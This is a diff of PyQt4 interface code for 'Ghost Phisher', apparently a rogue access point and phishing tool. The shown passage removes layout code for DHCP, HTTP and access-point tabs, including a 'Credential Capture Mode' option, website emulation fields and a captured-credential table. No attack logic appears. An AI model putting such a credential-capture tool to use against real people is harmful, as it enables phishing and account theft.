-        self.label_11.setObjectName(_fromUtf8("label_11"))
-        self.horizontalLayout_2.addWidget(self.label_11)
-        self.alternatedns_ip = QtGui.QLineEdit(self.groupBox_5)
-        self.alternatedns_ip.setObjectName(_fromUtf8("alternatedns_ip"))
-        self.horizontalLayout_2.addWidget(self.alternatedns_ip)
-        self.verticalLayout_8.addLayout(self.horizontalLayout_2)
-        self.horizontalLayout_30.addLayout(self.verticalLayout_8)
-        self.horizontalLayout_31.addLayout(self.horizontalLayout_30)
-        self.verticalLayout_9.addLayout(self.horizontalLayout_31)
-        self.verticalLayout_7.addWidget(self.groupBox_5)
-        self.groupBox_6 = QtGui.QGroupBox(self.tab_2)
-        self.groupBox_6.setObjectName(_fromUtf8("groupBox_6"))
-        self.verticalLayout_23 = QtGui.QVBoxLayout(self.groupBox_6)
-        self.verticalLayout_23.setObjectName(_fromUtf8("verticalLayout_23"))
-        self.dhcp_status = QtGui.QTextBrowser(self.groupBox_6)
-        self.dhcp_status.setObjectName(_fromUtf8("dhcp_status"))
-        self.verticalLayout_23.addWidget(self.dhcp_status)
-        self.verticalLayout_7.addWidget(self.groupBox_6)
-        self.horizontalLayout_13 = QtGui.QHBoxLayout()
-        self.horizontalLayout_13.setObjectName(_fromUtf8("horizontalLayout_13"))
-        spacerItem22 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_13.addItem(spacerItem22)
-        self.dhcp_start = QtGui.QPushButton(self.tab_2)
-        self.dhcp_start.setObjectName(_fromUtf8("dhcp_start"))
-        self.horizontalLayout_13.addWidget(self.dhcp_start)
-        spacerItem23 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_13.addItem(spacerItem23)
-        self.dhcp_stop = QtGui.QPushButton(self.tab_2)
-        self.dhcp_stop.setObjectName(_fromUtf8("dhcp_stop"))
-        self.horizontalLayout_13.addWidget(self.dhcp_stop)
-        spacerItem24 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_13.addItem(spacerItem24)
-        self.verticalLayout_7.addLayout(self.horizontalLayout_13)
-        self.verticalLayout_26.addLayout(self.verticalLayout_7)
-        self.tabWidget.addTab(self.tab_2, _fromUtf8(""))
-        self.tab = QtGui.QWidget()
-        self.tab.setObjectName(_fromUtf8("tab"))
-        self.verticalLayout_17 = QtGui.QVBoxLayout(self.tab)
-        self.verticalLayout_17.setObjectName(_fromUtf8("verticalLayout_17"))
-        self.groupBox_7 = QtGui.QGroupBox(self.tab)
-        self.groupBox_7.setObjectName(_fromUtf8("groupBox_7"))
-        self.verticalLayout_11 = QtGui.QVBoxLayout(self.groupBox_7)
-        self.verticalLayout_11.setObjectName(_fromUtf8("verticalLayout_11"))
-        self.horizontalLayout_7 = QtGui.QHBoxLayout()
-        self.horizontalLayout_7.setObjectName(_fromUtf8("horizontalLayout_7"))
-        self.http_interface_combo = QtGui.QComboBox(self.groupBox_7)
-        self.http_interface_combo.setObjectName(_fromUtf8("http_interface_combo"))
-        self.horizontalLayout_7.addWidget(self.http_interface_combo)
-        spacerItem25 = QtGui.QSpacerItem(102, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_7.addItem(spacerItem25)
-        self.http_ip_combo = QtGui.QComboBox(self.groupBox_7)
-        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Preferred, QtGui.QSizePolicy.Preferred)
-        sizePolicy.setHorizontalStretch(0)
-        sizePolicy.setVerticalStretch(16)
-        sizePolicy.setHeightForWidth(self.http_ip_combo.sizePolicy().hasHeightForWidth())
-        self.http_ip_combo.setSizePolicy(sizePolicy)
-        self.http_ip_combo.setObjectName(_fromUtf8("http_ip_combo"))
-        self.horizontalLayout_7.addWidget(self.http_ip_combo)
-        self.verticalLayout_11.addLayout(self.horizontalLayout_7)
-        self.horizontalLayout_15 = QtGui.QHBoxLayout()
-        self.horizontalLayout_15.setObjectName(_fromUtf8("horizontalLayout_15"))
-        self.current_card_label_2 = QtGui.QLabel(self.groupBox_7)
-        self.current_card_label_2.setObjectName(_fromUtf8("current_card_label_2"))
-        self.horizontalLayout_15.addWidget(self.current_card_label_2)
-        spacerItem26 = QtGui.QSpacerItem(70, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_15.addItem(spacerItem26)
-        self.http_ip_label = QtGui.QLabel(self.groupBox_7)
-        self.http_ip_label.setToolTip(_fromUtf8(""))
-        self.http_ip_label.setObjectName(_fromUtf8("http_ip_label"))
-        self.horizontalLayout_15.addWidget(self.http_ip_label)
-        self.verticalLayout_11.addLayout(self.horizontalLayout_15)
-        self.horizontalLayout_16 = QtGui.QHBoxLayout()
-        self.horizontalLayout_16.setObjectName(_fromUtf8("horizontalLayout_16"))
-        self.http_port_label = QtGui.QLabel(self.groupBox_7)
-        self.http_port_label.setObjectName(_fromUtf8("http_port_label"))
-        self.horizontalLayout_16.addWidget(self.http_port_label)
-        spacerItem27 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_16.addItem(spacerItem27)
-        self.label_13 = QtGui.QLabel(self.groupBox_7)
-        self.label_13.setObjectName(_fromUtf8("label_13"))
-        self.horizontalLayout_16.addWidget(self.label_13)
-        self.verticalLayout_11.addLayout(self.horizontalLayout_16)
-        self.verticalLayout_17.addWidget(self.groupBox_7)
-        self.groupBox_8 = QtGui.QGroupBox(self.tab)
-        self.groupBox_8.setObjectName(_fromUtf8("groupBox_8"))
-        self.verticalLayout_15 = QtGui.QVBoxLayout(self.groupBox_8)
-        self.verticalLayout_15.setObjectName(_fromUtf8("verticalLayout_15"))
-        self.horizontalLayout_19 = QtGui.QHBoxLayout()
-        self.horizontalLayout_19.setObjectName(_fromUtf8("horizontalLayout_19"))
-        self.emulate_website_radio = QtGui.QRadioButton(self.groupBox_8)
-        self.emulate_website_radio.setObjectName(_fromUtf8("emulate_website_radio"))
-        self.horizontalLayout_19.addWidget(self.emulate_website_radio)
-        self.emulate_website_label = QtGui.QLineEdit(self.groupBox_8)
-        self.emulate_website_label.setStatusTip(_fromUtf8(""))
-        self.emulate_website_label.setInputMask(_fromUtf8(""))
-        self.emulate_website_label.setText(_fromUtf8(""))
-        self.emulate_website_label.setEchoMode(QtGui.QLineEdit.Normal)
-        self.emulate_website_label.setDragEnabled(False)
-        self.emulate_website_label.setReadOnly(False)
-        self.emulate_website_label.setObjectName(_fromUtf8("emulate_website_label"))
-        self.horizontalLayout_19.addWidget(self.emulate_website_label)
-        self.verticalLayout_15.addLayout(self.horizontalLayout_19)
-        self.horizontalLayout_20 = QtGui.QHBoxLayout()
-        self.horizontalLayout_20.setObjectName(_fromUtf8("horizontalLayout_20"))
-        self.select_website_radio = QtGui.QRadioButton(self.groupBox_8)
-        self.select_website_radio.setChecked(True)
-        self.select_website_radio.setObjectName(_fromUtf8("select_website_radio"))
-        self.horizontalLayout_20.addWidget(self.select_website_radio)
-        self.website_linedit = QtGui.QLineEdit(self.groupBox_8)
-        self.website_linedit.setObjectName(_fromUtf8("website_linedit"))
-        self.horizontalLayout_20.addWidget(self.website_linedit)
-        self.website_button = QtGui.QPushButton(self.groupBox_8)
-        self.website_button.setObjectName(_fromUtf8("website_button"))
-        self.horizontalLayout_20.addWidget(self.website_button)
-        self.verticalLayout_15.addLayout(self.horizontalLayout_20)
-        self.horizontalLayout_11 = QtGui.QHBoxLayout()
-        self.horizontalLayout_11.setObjectName(_fromUtf8("horizontalLayout_11"))
-        self.label_25 = QtGui.QLabel(self.groupBox_8)
-        self.label_25.setObjectName(_fromUtf8("label_25"))
-        self.horizontalLayout_11.addWidget(self.label_25)
-        self.lineEdit_2 = QtGui.QLineEdit(self.groupBox_8)
-        self.lineEdit_2.setObjectName(_fromUtf8("lineEdit_2"))
-        self.horizontalLayout_11.addWidget(self.lineEdit_2)
-        self.horizontalLayout_43 = QtGui.QHBoxLayout()
-        self.horizontalLayout_43.setObjectName(_fromUtf8("horizontalLayout_43"))
-        self.run_webpage_port_radio = QtGui.QCheckBox(self.groupBox_8)
-        self.run_webpage_port_radio.setObjectName(_fromUtf8("run_webpage_port_radio"))
-        self.horizontalLayout_43.addWidget(self.run_webpage_port_radio)
-        self.use_port_http = QtGui.QLineEdit(self.groupBox_8)
-        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Fixed)
-        sizePolicy.setHorizontalStretch(0)
-        sizePolicy.setVerticalStretch(0)
-        sizePolicy.setHeightForWidth(self.use_port_http.sizePolicy().hasHeightForWidth())
-        self.use_port_http.setSizePolicy(sizePolicy)
-        self.use_port_http.setObjectName(_fromUtf8("use_port_http"))
-        self.horizontalLayout_43.addWidget(self.use_port_http)
-        self.label_14 = QtGui.QLabel(self.groupBox_8)
-        self.label_14.setObjectName(_fromUtf8("label_14"))
-        self.horizontalLayout_43.addWidget(self.label_14)
-        self.horizontalLayout_11.addLayout(self.horizontalLayout_43)
-        self.verticalLayout_15.addLayout(self.horizontalLayout_11)
-        self.horizontalLayout_21 = QtGui.QHBoxLayout()
-        self.horizontalLayout_21.setObjectName(_fromUtf8("horizontalLayout_21"))
-        spacerItem28 = QtGui.QSpacerItem(0, 0, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_21.addItem(spacerItem28)
-        self.verticalLayout_15.addLayout(self.horizontalLayout_21)
-        self.verticalLayout_17.addWidget(self.groupBox_8)
-        self.groupBox_9 = QtGui.QGroupBox(self.tab)
-        self.groupBox_9.setObjectName(_fromUtf8("groupBox_9"))
-        self.verticalLayout_14 = QtGui.QVBoxLayout(self.groupBox_9)
-        self.verticalLayout_14.setObjectName(_fromUtf8("verticalLayout_14"))
-        self.horizontalLayout_22 = QtGui.QHBoxLayout()
-        self.horizontalLayout_22.setObjectName(_fromUtf8("horizontalLayout_22"))
-        spacerItem29 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_22.addItem(spacerItem29)
-        self.capture_radio = QtGui.QRadioButton(self.groupBox_9)
-        self.capture_radio.setChecked(True)
-        self.capture_radio.setObjectName(_fromUtf8("capture_radio"))
-        self.horizontalLayout_22.addWidget(self.capture_radio)
-        spacerItem30 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_22.addItem(spacerItem30)
-        self.hosting_radio = QtGui.QRadioButton(self.groupBox_9)
-        self.hosting_radio.setObjectName(_fromUtf8("hosting_radio"))
-        self.horizontalLayout_22.addWidget(self.hosting_radio)
-        spacerItem31 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_22.addItem(spacerItem31)
-        self.verticalLayout_14.addLayout(self.horizontalLayout_22)
-        self.verticalLayout_17.addWidget(self.groupBox_9)
-        self.groupBox_10 = QtGui.QGroupBox(self.tab)
-        self.groupBox_10.setToolTip(_fromUtf8(""))
-        self.groupBox_10.setStatusTip(_fromUtf8(""))
-        self.groupBox_10.setWhatsThis(_fromUtf8(""))
-        self.groupBox_10.setObjectName(_fromUtf8("groupBox_10"))
-        self.horizontalLayout_17 = QtGui.QHBoxLayout(self.groupBox_10)
-        self.horizontalLayout_17.setObjectName(_fromUtf8("horizontalLayout_17"))
-        self.status_textbrowser_http = QtGui.QTextBrowser(self.groupBox_10)
-        self.status_textbrowser_http.setObjectName(_fromUtf8("status_textbrowser_http"))
-        self.horizontalLayout_17.addWidget(self.status_textbrowser_http)
-        self.verticalLayout_17.addWidget(self.groupBox_10)
-        self.verticalLayout_13 = QtGui.QVBoxLayout()
-        self.verticalLayout_13.setObjectName(_fromUtf8("verticalLayout_13"))
-        self.verticalLayout_12 = QtGui.QVBoxLayout()
-        self.verticalLayout_12.setObjectName(_fromUtf8("verticalLayout_12"))
-        self.http_captured_credential = QtGui.QLabel(self.tab)
-        self.http_captured_credential.setObjectName(_fromUtf8("http_captured_credential"))
-        self.verticalLayout_12.addWidget(self.http_captured_credential)
-        self.http_captured_credential_2 = QtGui.QLabel(self.tab)
-        self.http_captured_credential_2.setObjectName(_fromUtf8("http_captured_credential_2"))
-        self.verticalLayout_12.addWidget(self.http_captured_credential_2)
-        self.verticalLayout_13.addLayout(self.verticalLayout_12)
-        self.horizontalLayout_18 = QtGui.QHBoxLayout()
-        self.horizontalLayout_18.setObjectName(_fromUtf8("horizontalLayout_18"))
-        spacerItem32 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_18.addItem(spacerItem32)
-        self.http_start = QtGui.QPushButton(self.tab)
-        self.http_start.setObjectName(_fromUtf8("http_start"))
-        self.horizontalLayout_18.addWidget(self.http_start)
-        spacerItem33 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_18.addItem(spacerItem33)
-        self.http_stop = QtGui.QPushButton(self.tab)
-        self.http_stop.setObjectName(_fromUtf8("http_stop"))
-        self.horizontalLayout_18.addWidget(self.http_stop)
-        spacerItem34 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_18.addItem(spacerItem34)
-        self.verticalLayout_13.addLayout(self.horizontalLayout_18)
-        self.verticalLayout_17.addLayout(self.verticalLayout_13)
-        self.tabWidget.addTab(self.tab, _fromUtf8(""))
-        self.tab_3 = QtGui.QWidget()
-        self.tab_3.setObjectName(_fromUtf8("tab_3"))
-        self.horizontalLayout_28 = QtGui.QHBoxLayout(self.tab_3)
-        self.horizontalLayout_28.setObjectName(_fromUtf8("horizontalLayout_28"))
-        self.verticalLayout_22 = QtGui.QVBoxLayout()
-        self.verticalLayout_22.setObjectName(_fromUtf8("verticalLayout_22"))
-        self.credential_table = QtGui.QTableWidget(self.tab_3)
-        self.credential_table.setObjectName(_fromUtf8("credential_table"))
-        self.credential_table.setColumnCount(3)
-        self.credential_table.setRowCount(0)
-        item = QtGui.QTableWidgetItem()
-        self.credential_table.setHorizontalHeaderItem(0, item)
-        item = QtGui.QTableWidgetItem()
-        self.credential_table.setHorizontalHeaderItem(1, item)
-        item = QtGui.QTableWidgetItem()
-        self.credential_table.setHorizontalHeaderItem(2, item)
-        self.verticalLayout_22.addWidget(self.credential_table)
-        spacerItem35 = QtGui.QSpacerItem(15, 6, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_22.addItem(spacerItem35)
-        self.horizontalLayout_26 = QtGui.QHBoxLayout()
-        self.horizontalLayout_26.setObjectName(_fromUtf8("horizontalLayout_26"))
-        spacerItem36 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_26.addItem(spacerItem36)
-        self.savechanges_button = QtGui.QPushButton(self.tab_3)
-        self.savechanges_button.setObjectName(_fromUtf8("savechanges_button"))
-        self.horizontalLayout_26.addWidget(self.savechanges_button)
-        spacerItem37 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_26.addItem(spacerItem37)
-        self.insert_button = QtGui.QPushButton(self.tab_3)
-        self.insert_button.setObjectName(_fromUtf8("insert_button"))
-        self.horizontalLayout_26.addWidget(self.insert_button)
-        spacerItem38 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_26.addItem(spacerItem38)
-        self.delete_button = QtGui.QPushButton(self.tab_3)
-        self.delete_button.setObjectName(_fromUtf8("delete_button"))
-        self.horizontalLayout_26.addWidget(self.delete_button)
-        spacerItem39 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_26.addItem(spacerItem39)
-        self.verticalLayout_22.addLayout(self.horizontalLayout_26)
-        self.horizontalLayout_28.addLayout(self.verticalLayout_22)
-        self.tabWidget.addTab(self.tab_3, _fromUtf8(""))
-        self.tab_4 = QtGui.QWidget()
-        self.tab_4.setObjectName(_fromUtf8("tab_4"))
-        self.horizontalLayout_27 = QtGui.QHBoxLayout(self.tab_4)
-        self.horizontalLayout_27.setObjectName(_fromUtf8("horizontalLayout_27"))
-        self.verticalLayout_21 = QtGui.QVBoxLayout()
-        self.verticalLayout_21.setObjectName(_fromUtf8("verticalLayout_21"))
-        self.groupBox_13 = QtGui.QGroupBox(self.tab_4)
-        self.groupBox_13.setObjectName(_fromUtf8("groupBox_13"))
-        self.horizontalLayout_23 = QtGui.QHBoxLayout(self.groupBox_13)
-        self.horizontalLayout_23.setObjectName(_fromUtf8("horizontalLayout_23"))
-        self.verticalLayout_20 = QtGui.QVBoxLayout()
-        self.verticalLayout_20.setObjectName(_fromUtf8("verticalLayout_20"))
-        self.label_17 = QtGui.QLabel(self.groupBox_13)
-        self.label_17.setObjectName(_fromUtf8("label_17"))
-        self.verticalLayout_20.addWidget(self.label_17)
-        spacerItem40 = QtGui.QSpacerItem(23, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_20.addItem(spacerItem40)
-        self.label_18 = QtGui.QLabel(self.groupBox_13)
-        self.label_18.setObjectName(_fromUtf8("label_18"))
-        self.verticalLayout_20.addWidget(self.label_18)
-        spacerItem41 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_20.addItem(spacerItem41)
-        self.label_20 = QtGui.QLabel(self.groupBox_13)
-        self.label_20.setObjectName(_fromUtf8("label_20"))
-        self.verticalLayout_20.addWidget(self.label_20)
-        spacerItem42 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_20.addItem(spacerItem42)
-        self.label_19 = QtGui.QLabel(self.groupBox_13)
-        self.label_19.setObjectName(_fromUtf8("label_19"))
-        self.verticalLayout_20.addWidget(self.label_19)
-        self.horizontalLayout_23.addLayout(self.verticalLayout_20)
-        self.verticalLayout_21.addWidget(self.groupBox_13)
-        self.groupBox_11 = QtGui.QGroupBox(self.tab_4)
-        self.groupBox_11.setObjectName(_fromUtf8("groupBox_11"))
-        self.horizontalLayout_24 = QtGui.QHBoxLayout(self.groupBox_11)
-        self.horizontalLayout_24.setObjectName(_fromUtf8("horizontalLayout_24"))
-        self.verticalLayout_18 = QtGui.QVBoxLayout()
-        self.verticalLayout_18.setObjectName(_fromUtf8("verticalLayout_18"))
-        self.label_21 = QtGui.QLabel(self.groupBox_11)
-        self.label_21.setObjectName(_fromUtf8("label_21"))
-        self.verticalLayout_18.addWidget(self.label_21)
-        self.label_22 = QtGui.QLabel(self.groupBox_11)
-        self.label_22.setObjectName(_fromUtf8("label_22"))
-        self.verticalLayout_18.addWidget(self.label_22)
-        self.label_23 = QtGui.QLabel(self.groupBox_11)
-        self.label_23.setObjectName(_fromUtf8("label_23"))
-        self.verticalLayout_18.addWidget(self.label_23)
-        spacerItem43 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_18.addItem(spacerItem43)
-        spacerItem44 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_18.addItem(spacerItem44)
-        self.horizontalLayout_24.addLayout(self.verticalLayout_18)
-        self.verticalLayout_21.addWidget(self.groupBox_11)
-        self.groupBox_12 = QtGui.QGroupBox(self.tab_4)
-        self.groupBox_12.setObjectName(_fromUtf8("groupBox_12"))
-        self.horizontalLayout_25 = QtGui.QHBoxLayout(self.groupBox_12)
-        self.horizontalLayout_25.setObjectName(_fromUtf8("horizontalLayout_25"))
-        self.verticalLayout_19 = QtGui.QVBoxLayout()
-        self.verticalLayout_19.setObjectName(_fromUtf8("verticalLayout_19"))
-        spacerItem45 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_19.addItem(spacerItem45)
-        self.horizontalLayout_44 = QtGui.QHBoxLayout()
-        self.horizontalLayout_44.setObjectName(_fromUtf8("horizontalLayout_44"))
-        self.label_15 = QtGui.QLabel(self.groupBox_12)
-        self.label_15.setObjectName(_fromUtf8("label_15"))
-        self.horizontalLayout_44.addWidget(self.label_15)
-        spacerItem46 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_44.addItem(spacerItem46)
-        self.label_26 = QtGui.QLabel(self.groupBox_12)
-        self.label_26.setText(_fromUtf8(""))
-        self.label_26.setObjectName(_fromUtf8("label_26"))
-        self.horizontalLayout_44.addWidget(self.label_26)
-        spacerItem47 = QtGui.QSpacerItem(300, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_44.addItem(spacerItem47)
-        self.verticalLayout_19.addLayout(self.horizontalLayout_44)
-        self.horizontalLayout_45 = QtGui.QHBoxLayout()
-        self.horizontalLayout_45.setObjectName(_fromUtf8("horizontalLayout_45"))
-        self.label_27 = QtGui.QLabel(self.groupBox_12)
-        self.label_27.setObjectName(_fromUtf8("label_27"))
-        self.horizontalLayout_45.addWidget(self.label_27)
-        spacerItem48 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_45.addItem(spacerItem48)
-        self.label_28 = QtGui.QLabel(self.groupBox_12)
-        self.label_28.setText(_fromUtf8(""))
-        self.label_28.setObjectName(_fromUtf8("label_28"))
-        self.horizontalLayout_45.addWidget(self.label_28)
-        spacerItem49 = QtGui.QSpacerItem(300, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_45.addItem(spacerItem49)
-        self.verticalLayout_19.addLayout(self.horizontalLayout_45)
-        spacerItem50 = QtGui.QSpacerItem(20, 10, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_19.addItem(spacerItem50)
-        self.label_16 = QtGui.QLabel(self.groupBox_12)
-        font = QtGui.QFont()
-        font.setWeight(50)
-        font.setBold(False)
-        self.label_16.setFont(font)
-        self.label_16.setObjectName(_fromUtf8("label_16"))
-        self.verticalLayout_19.addWidget(self.label_16)
-        self.label_24 = QtGui.QLabel(self.groupBox_12)
-        font = QtGui.QFont()
-        font.setWeight(50)
-        font.setBold(False)
-        self.label_24.setFont(font)
-        self.label_24.setText(_fromUtf8(""))
-        self.label_24.setObjectName(_fromUtf8("label_24"))
-        self.verticalLayout_19.addWidget(self.label_24)
-        spacerItem51 = QtGui.QSpacerItem(24, 13, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_19.addItem(spacerItem51)
-        self.horizontalLayout_25.addLayout(self.verticalLayout_19)
-        self.verticalLayout_21.addWidget(self.groupBox_12)
-        self.horizontalLayout_27.addLayout(self.verticalLayout_21)
-        self.tabWidget.addTab(self.tab_4, _fromUtf8(""))
-        self.verticalLayout_10.addWidget(self.tabWidget)
-        ghost_phisher.setCentralWidget(self.centralwidget)
-
-        self.scene = QtGui.QGraphicsScene()
-        self.scene.addPixmap(QtGui.QPixmap('%s/gui/images/banner.png'%(cwd)))
-        self.graphicsView.setScene(self.scene)
-        factor = 60 / 100.0
-        matrix = self.graphicsView.matrix()
-        matrix.reset()
-        matrix.scale(factor, factor)
-        self.graphicsView.setMatrix(matrix)
-        self.retranslateUi(ghost_phisher)
-        self.tabWidget.setCurrentIndex(0)
-        QtCore.QMetaObject.connectSlotsByName(ghost_phisher)
-        self.retranslateUi(ghost_phisher)
-        self.tabWidget.setCurrentIndex(0)
-        QtCore.QMetaObject.connectSlotsByName(ghost_phisher)
+# Ghost Trap HTTP Object
+ghost_trap_http = ghost_trap_core.Ghost_Trap_http()             # Ghost Trap HTTP Class
 
 
-    def retranslateUi(self, ghost_phisher):
-        ghost_phisher.setWindowTitle(QtGui.QApplication.translate("ghost_phisher", "Ghost Phisher", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_15.setTitle(QtGui.QApplication.translate("ghost_phisher", "Access Point Details", None, QtGui.QApplication.UnicodeUTF8))
-        self.access_point_label.setText(QtGui.QApplication.translate("ghost_phisher", "Acess Point Name:", None, QtGui.QApplication.UnicodeUTF8))
-        self.channel_label.setText(QtGui.QApplication.translate("ghost_phisher", "Channel:", None, QtGui.QApplication.UnicodeUTF8))
-        self.ip_address_label.setText(QtGui.QApplication.translate("ghost_phisher", "IP address:", None, QtGui.QApplication.UnicodeUTF8))
-        self.main_mac_address_label.setText(QtGui.QApplication.translate("ghost_phisher", "Mac Address:", None, QtGui.QApplication.UnicodeUTF8))
-        self.access_runtime.setText(QtGui.QApplication.translate("ghost_phisher", "Runtime:", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_14.setTitle(QtGui.QApplication.translate("ghost_phisher", "Wireless Interface ", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_25.setText(QtGui.QApplication.translate("ghost_phisher", "Real Website IP Address or Url:", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_9.setTitle(QtGui.QApplication.translate("ghost_phisher", " Service Mode", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_25.setText(QtGui.QApplication.translate("ghost_phisher", "Real Website IP Address or Url:", None, QtGui.QApplication.UnicodeUTF8))
-        self.capture_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Credential Capture Mode", None, QtGui.QApplication.UnicodeUTF8))
-        self.hosting_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Hosting  Mode", None, QtGui.QApplication.UnicodeUTF8))
-        self.comboBox.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Select the wireless interface card you would like to use</p>\n"
-"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.refresh_button.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">click to refresh list of newly inserted interface cards</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.refresh_button.setText(QtGui.QApplication.translate("ghost_phisher", "   Refresh Card List  ", None, QtGui.QApplication.UnicodeUTF8))
-        self.acess_interface.setText(QtGui.QApplication.translate("ghost_phisher", "Current Interface:", None, QtGui.QApplication.UnicodeUTF8))
-        self.mac_address_label.setText(QtGui.QApplication.translate("ghost_phisher", "Mac Address:", None, QtGui.QApplication.UnicodeUTF8))
-        self.driver_label.setText(QtGui.QApplication.translate("ghost_phisher", "Driver:", None, QtGui.QApplication.UnicodeUTF8))
-        self.monitor_label.setText(QtGui.QApplication.translate("ghost_phisher", "Monitor:", None, QtGui.QApplication.UnicodeUTF8))
-        self.monitor_button.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">click to place wirless card on monitor mode</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.monitor_button.setText(QtGui.QApplication.translate("ghost_phisher", "Set Monitor", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_16.setTitle(QtGui.QApplication.translate("ghost_phisher", "Access Point Settings", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_36.setText(QtGui.QApplication.translate("ghost_phisher", "SSID:", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_37.setText(QtGui.QApplication.translate("ghost_phisher", "IP Address:", None, QtGui.QApplication.UnicodeUTF8))
